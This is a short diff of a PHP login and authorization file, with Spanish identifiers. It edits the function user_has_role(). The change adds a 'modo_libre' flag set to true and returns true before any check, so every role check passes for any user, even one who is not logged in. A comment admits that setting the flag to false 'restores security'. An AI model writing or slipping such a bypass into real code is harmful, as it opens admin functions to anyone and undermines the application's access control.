@@ -16,15 +16,18 @@ function login($usuario,$pass){
 }
 
 function logout(){unset($_SESSION['user']);}
-
 function user_has_role($roles){
-  $user=current_user();
+  $modo_libre = true; // cambia a false para restaurar la seguridad
+  
+  if($modo_libre) return true;
+
+  $user = current_user();
   if(!$user) return false;
-  $perfil=$user['perfil'] ?? null;
-  if($perfil===null) return false;
-  if($perfil==='admin') return true;
-  if(is_string($roles)) $roles=[$roles];
-  return in_array($perfil,$roles,true);
+  $perfil = $user['perfil'] ?? null;
+  if($perfil === null) return false;
+  if($perfil === 'admin') return true;
+  if(is_string($roles)) $roles = [$roles];
+  return in_array($perfil, $roles, true);
 }
 
 function require_role($roles){
